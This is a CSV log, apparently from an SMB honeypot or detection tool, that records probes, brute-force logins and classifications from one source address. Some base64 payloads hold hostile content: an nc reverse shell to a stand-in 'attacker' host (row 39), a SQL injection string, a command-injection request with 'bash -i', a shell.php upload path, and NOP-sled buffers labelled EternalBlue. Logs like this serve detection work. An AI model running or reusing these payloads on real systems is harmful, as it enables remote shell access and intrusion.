id,timestamp,day,src_ip,src_port,dst_port,protocol,event_type,raw,parsed,classification,confidence,details,headers
11,2026-01-08T15:50:13.366979177+00:00,2026-01-08,151.101.129.91,27387,445,SMB,data,AAAAJv9TTUIBdXNlcm5hbWU9YXR0YWNrZXI5ClNFU1NJT05fU0VUVVAK,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x01"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":56}",
12,2026-01-08T15:50:13.532487802+00:00,2026-01-08,151.101.129.91,55967,445,SMB,data,AAAAJ/9TTUIBdXNlcm5hbWU9YXR0YWNrZXIxMApTRVNTSU9OX1NFVFVQCg==,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x01"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":60}",
13,2026-01-08T15:50:13.705805885+00:00,2026-01-08,151.101.129.91,44758,445,SMB,data,AAAAJ/9TTUIBdXNlcm5hbWU9YXR0YWNrZXIxMQpTRVNTSU9OX1NFVFVQCg==,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x01"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":60}",
14,2026-01-08T15:50:13.872907302+00:00,2026-01-08,151.101.129.91,55080,445,SMB,data,AAAADf9TTUIQcHJvYmUtMTY=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x10"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":24}",
15,2026-01-08T15:50:13.961776844+00:00,2026-01-08,151.101.129.91,43196,445,SMB,data,AAAADf9TTUIRcHJvYmUtMTc=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x11"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":24}",
16,2026-01-08T15:50:14.055528552+00:00,2026-01-08,151.101.129.91,52392,445,SMB,data,AAAADf9TTUIScHJvYmUtMTg=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x12"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":24}",
17,2026-01-08T15:50:14.143862719+00:00,2026-01-08,151.101.129.91,37014,445,SMB,data,AAAADf9TTUITcHJvYmUtMTk=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x13"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":24}",
18,2026-01-08T15:50:14.232783760+00:00,2026-01-08,151.101.129.91,59682,445,SMB,data,AAAADf9TTUIUcHJvYmUtMjA=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x14"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":24}",
19,2026-01-08T15:50:14.324491010+00:00,2026-01-08,151.101.129.91,55329,445,SMB,data,AAAADf9TTUIVcHJvYmUtMjE=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x15"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":24}",
20,2026-01-08T15:50:14.411560469+00:00,2026-01-08,151.101.129.91,62325,445,SMB,data,AAAADf9TTUIWcHJvYmUtMjI=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x16"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":24}",
21,2026-01-08T15:50:14.503788927+00:00,2026-01-08,151.101.129.91,59421,445,SMB,data,AAAADf9TTUIXcHJvYmUtMjM=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x17"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":24}",
22,2026-01-08T15:50:14.596874802+00:00,2026-01-08,151.101.129.91,26221,445,SMB,data,AAAADf9TTUIYcHJvYmUtMjQ=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x18"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":24}",
23,2026-01-08T15:50:14.689415094+00:00,2026-01-08,151.101.129.91,31510,445,SMB,data,AAAADf9TTUIZcHJvYmUtMjU=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x19"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":24}",
24,2026-01-08T15:50:14.781257177+00:00,2026-01-08,151.101.129.91,43009,445,SMB,data,AAAADf9TTUIacHJvYmUtMjY=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x1A"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":24}",
25,2026-01-08T15:50:14.874132511+00:00,2026-01-08,151.101.129.91,43170,445,SMB,data,AAAADf9TTUIbcHJvYmUtMjc=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x1B"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":24}",
26,2026-01-08T15:50:14.966711052+00:00,2026-01-08,151.101.129.91,31545,445,SMB,data,AAAADf9TTUIccHJvYmUtMjg=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x1C"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":24}",
27,2026-01-08T15:50:15.060585511+00:00,2026-01-08,151.101.129.91,62620,445,SMB,data,AAAADf9TTUIdcHJvYmUtMjk=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x1D"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":24}",
28,2026-01-08T15:50:15.153963927+00:00,2026-01-08,151.101.129.91,50199,445,SMB,data,AAAADf9TTUIecHJvYmUtMzA=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x1E"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":24}",
29,2026-01-08T15:50:15.247311844+00:00,2026-01-08,151.101.129.91,31863,445,SMB,data,AAAADf9TTUIfcHJvYmUtMzE=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x1F"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":24}",
30,2026-01-08T15:50:15.336170344+00:00,2026-01-08,151.101.129.91,25896,445,SMB,data,AAAADf9TTUIgcHJvYmUtMzI=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x20"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":24}",
31,2026-01-08T15:50:15.430535344+00:00,2026-01-08,151.101.129.91,22453,445,SMB,data,AAAADf9TTUIhcHJvYmUtMzM=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x21"",""metadata"":""-""}",scanning,0.8,"{""unique_commands"":20}",
32,2026-01-08T15:50:15.520234511+00:00,2026-01-08,151.101.129.91,19860,445,SMB,data,AAAADf9TTUIicHJvYmUtMzQ=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x22"",""metadata"":""-""}",scanning,0.8,"{""unique_commands"":21}",
33,2026-01-08T15:50:15.610560844+00:00,2026-01-08,151.101.129.91,32579,445,SMB,data,AAAADf9TTUIjcHJvYmUtMzU=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x23"",""metadata"":""-""}",scanning,0.8,"{""unique_commands"":22}",
34,2026-01-08T15:50:15.701650928+00:00,2026-01-08,151.101.129.91,22283,445,SMB,data,AAAADf9TTUIkcHJvYmUtMzY=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x24"",""metadata"":""-""}",scanning,0.8,"{""unique_commands"":23}",
35,2026-01-08T15:50:15.793593178+00:00,2026-01-08,151.101.129.91,24472,445,SMB,data,AAAADf9TTUIlcHJvYmUtMzc=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x25"",""metadata"":""-""}",scanning,0.8,"{""unique_commands"":24}",
36,2026-01-08T15:50:15.886996969+00:00,2026-01-08,151.101.129.91,16995,445,SMB,data,AAAADf9TTUImcHJvYmUtMzg=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x26"",""metadata"":""-""}",scanning,0.8,"{""unique_commands"":25}",
37,2026-01-08T15:50:15.978957678+00:00,2026-01-08,151.101.129.91,56466,445,SMB,data,AAAADf9TTUIncHJvYmUtMzk=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x27"",""metadata"":""-""}",scanning,0.8,"{""unique_commands"":26}",
38,2026-01-08T15:50:16.068739886+00:00,2026-01-08,151.101.129.91,49169,445,SMB,data,AAAADf9TTUIocHJvYmUtNDA=,"{""protocol"":""SMBv1"",""command"":""SMB1_CMD_0x28"",""metadata"":""-""}",scanning,0.8,"{""unique_commands"":27}",
39,2026-01-08T15:50:16.159779845+00:00,2026-01-08,151.101.129.91,18268,445,SMB,data,AAAAX/9TTUIuUE9TVCAvdnVsbmVyYWJsZSBIVFRQLzEuMQ0KSG9zdDogdGFyZ2V0DQoNCmNvbW1hbmQ9YmFzaCAtaSAmJiBuYyBhdHRhY2tlciA0NDQ0IC1lIC9iaW4vc2gK,"{""protocol"":""SMBv1"",""command"":""WRITE_ANDX"",""metadata"":""-""}",scanning,0.8,"{""unique_commands"":28}",
40,2026-01-08T15:50:16.221179095+00:00,2026-01-08,151.101.129.91,39754,445,SMB,data,AAAAz/9TTUKiTVqQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkA==,"{""protocol"":""SMBv1"",""command"":""NT_TRANSACT_SECONDARY (EternalBlue?)"",""metadata"":""-""}",scanning,0.8,"{""unique_commands"":29}",
41,2026-01-08T15:51:26.605631460+00:00,2026-01-08,151.101.129.91,22848,445,SMB,auth_attempt,AAAAY/5TTUIAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdXNlcm5hbWU9YWRtaW4wJnBhc3N3b3JkPXdyb25nMA==,"{""protocol"":""SMBv2/3"",""command"":""SESSION_SETUP"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":140}",
42,2026-01-08T15:51:26.865241419+00:00,2026-01-08,151.101.129.91,48374,445,SMB,auth_attempt,AAAAY/5TTUIAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdXNlcm5hbWU9YWRtaW4xJnBhc3N3b3JkPXdyb25nMQ==,"{""protocol"":""SMBv2/3"",""command"":""SESSION_SETUP"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":140}",
43,2026-01-08T15:51:27.130555044+00:00,2026-01-08,151.101.129.91,59069,445,SMB,auth_attempt,AAAAY/5TTUIAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdXNlcm5hbWU9YWRtaW4yJnBhc3N3b3JkPXdyb25nMg==,"{""protocol"":""SMBv2/3"",""command"":""SESSION_SETUP"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":140}",
44,2026-01-08T15:51:27.403554461+00:00,2026-01-08,151.101.129.91,44067,445,SMB,auth_attempt,AAAAY/5TTUIAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdXNlcm5hbWU9YWRtaW4zJnBhc3N3b3JkPXdyb25nMw==,"{""protocol"":""SMBv2/3"",""command"":""SESSION_SETUP"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":140}",
45,2026-01-08T15:51:27.671081669+00:00,2026-01-08,151.101.129.91,55479,445,SMB,auth_attempt,AAAAY/5TTUIAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdXNlcm5hbWU9YWRtaW40JnBhc3N3b3JkPXdyb25nNA==,"{""protocol"":""SMBv2/3"",""command"":""SESSION_SETUP"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":140}",
46,2026-01-08T15:51:27.936322669+00:00,2026-01-08,151.101.129.91,55707,445,SMB,auth_attempt,AAAAY/5TTUIAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdXNlcm5hbWU9YWRtaW41JnBhc3N3b3JkPXdyb25nNQ==,"{""protocol"":""SMBv2/3"",""command"":""SESSION_SETUP"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":140}",
47,2026-01-08T15:51:28.209197628+00:00,2026-01-08,151.101.129.91,36157,445,SMB,auth_attempt,AAAAY/5TTUIAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdXNlcm5hbWU9YWRtaW42JnBhc3N3b3JkPXdyb25nNg==,"{""protocol"":""SMBv2/3"",""command"":""SESSION_SETUP"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":140}",
48,2026-01-08T15:51:28.480568919+00:00,2026-01-08,151.101.129.91,53886,445,SMB,auth_attempt,AAAAY/5TTUIAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdXNlcm5hbWU9YWRtaW43JnBhc3N3b3JkPXdyb25nNw==,"{""protocol"":""SMBv2/3"",""command"":""SESSION_SETUP"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":140}",
49,2026-01-08T15:51:28.744030920+00:00,2026-01-08,151.101.129.91,46767,445,SMB,auth_attempt,AAAAY/5TTUIAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdXNlcm5hbWU9YWRtaW44JnBhc3N3b3JkPXdyb25nOA==,"{""protocol"":""SMBv2/3"",""command"":""SESSION_SETUP"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":140}",
50,2026-01-08T15:51:29.010869336+00:00,2026-01-08,151.101.129.91,21469,445,SMB,auth_attempt,AAAAY/5TTUIAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdXNlcm5hbWU9YWRtaW45JnBhc3N3b3JkPXdyb25nOQ==,"{""protocol"":""SMBv2/3"",""command"":""SESSION_SETUP"",""metadata"":""-""}",brute_force,0.9,"{""recent_auth_attempts"":10}",
51,2026-01-08T15:51:29.284677212+00:00,2026-01-08,151.101.129.91,47629,445,SMB,auth_attempt,AAAAZf5TTUIAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdXNlcm5hbWU9YWRtaW4xMCZwYXNzd29yZD13cm9uZzEw,"{""protocol"":""SMBv2/3"",""command"":""SESSION_SETUP"",""metadata"":""-""}",brute_force,0.9,"{""recent_auth_attempts"":11}",
52,2026-01-08T15:51:29.552213628+00:00,2026-01-08,151.101.129.91,39928,445,SMB,auth_attempt,AAAAZf5TTUIAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdXNlcm5hbWU9YWRtaW4xMSZwYXNzd29yZD13cm9uZzEx,"{""protocol"":""SMBv2/3"",""command"":""SESSION_SETUP"",""metadata"":""-""}",brute_force,0.9,"{""recent_auth_attempts"":12}",
53,2026-01-08T15:51:29.822649045+00:00,2026-01-08,151.101.129.91,54462,445,SMB,auth_attempt,AAAAdP5TTUIAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAR0VUIC92dWxuP2lkPTEgT1IgMT0xIEhUVFAvMS4xDQpIb3N0OiB0YXJnZXQNCg0K,"{""protocol"":""SMBv2/3"",""command"":""SESSION_SETUP"",""metadata"":""-""}",brute_force,0.9,"{""recent_auth_attempts"":13}",
54,2026-01-08T15:51:29.858861462+00:00,2026-01-08,151.101.129.91,28054,445,SMB,auth_attempt,AAAAjf5TTUIAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUE9TVCAvY21kIEhUVFAvMS4xDQpIb3N0OiB0YXJnZXQNCg0KY21kPXVuYW1lIC1hOyBscyAtbGEgL3RtcCAmJiBiYXNoIC1pCg==,"{""protocol"":""SMBv2/3"",""command"":""SESSION_SETUP"",""metadata"":""-""}",brute_force,0.9,"{""recent_auth_attempts"":14}",
55,2026-01-08T15:51:29.892141795+00:00,2026-01-08,151.101.129.91,39159,445,SMB,file_operation,AAAAPf9TTUJ1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXFwxMC4wLjAuMVx1cGxvYWRzXHNoZWxsLnBocAA=,"{""protocol"":""SMBv1"",""command"":""TREE_CONNECT_ANDX"",""metadata"":""\\10.0.0.1\uploads\shell.php""}",brute_force,0.9,"{""recent_auth_attempts"":14}",
56,2026-01-08T15:51:29.922336254+00:00,2026-01-08,151.101.129.91,29340,445,SMB,data,AAAEJ/9TTUKiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABNWpCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJA=,"{""protocol"":""SMBv1"",""command"":""NT_TRANSACT_SECONDARY (EternalBlue?)"",""metadata"":""-""}",brute_force,0.9,"{""recent_auth_attempts"":14}",
57,2026-01-08T15:55:25.208379626+00:00,2026-01-08,151.101.129.91,35639,445,SMB,data,gQAARCBGREVGRkNGR0VGRkNDQUNBQ0FDQUNBQ0FDQUNBQ0FDQQAgRURFTUVKRUZFT0ZFQ0FDQUNBQ0FDQUNBQ0FDQUNBQUEA,"{""protocol"":""UNKNOWN"",""command"":""UNKNOWN"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":96}",
58,2026-01-08T15:55:54.952118876+00:00,2026-01-08,151.101.129.91,49935,445,SMB,connection,AAABEP5TTUJAAAAAAAAAAAAAHwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkAAUAAQAAAH8AAADGjlAu4zHWSo1Ei9U+cHiJcAAAAAUAAAACAhACAAMCAxEDAAABACYAAAAAAAEAIAABAHkix2EvIASB0VOhICKmO78Q0lznoHELs83wMvJWP54GAAACAAoAAAAAAAQAAgABAAQAAwAAAAAAAAAIAAgAAAAAAAMAAgABAAAABQAoAAAAAABoAG8AcwB0AC4AZABvAGMAawBlAHIALgBpAG4AdABlAHIAbgBhAGwAAAEQAAAAAACTrSVQnLQR57Qjg96Wi818,"{""protocol"":""SMBv2/3"",""command"":""NEGOTIATE"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":368}",
59,2026-01-08T15:56:39.568430800+00:00,2026-01-08,151.101.129.91,18093,445,SMB,file_operation,AAAARf9TTUJ1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABcXDEyNy4wLjAuMVx1cGxvYWRzXG5ld2ZpbGUudHh0AA==,"{""protocol"":""SMBv1"",""command"":""TREE_CONNECT_ANDX"",""metadata"":""none""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":100}",
60,2026-01-08T15:56:39.682632633+00:00,2026-01-08,151.101.129.91,18093,445,SMB,data,AAAAMP9TTUIuVGhpcyBpcyBhIHRlc3QgZmlsZSBjcmVhdGVkIHZpYSByYXcgcGFja2V0Cg==,"{""protocol"":""SMBv1"",""command"":""WRITE_ANDX"",""metadata"":""-""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":72}",
61,2026-01-08T15:58:45.752186178+00:00,2026-01-08,151.101.129.91,29842,445,SMB,file_operation,AAAAL/9TTUJ1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMU19DT01NQU5E,"{""protocol"":""SMBv1"",""command"":""TREE_CONNECT_ANDX"",""metadata"":""none""}",unknown,0.2,"{""note"":""no rule matched"",""raw_b64_len"":68}",
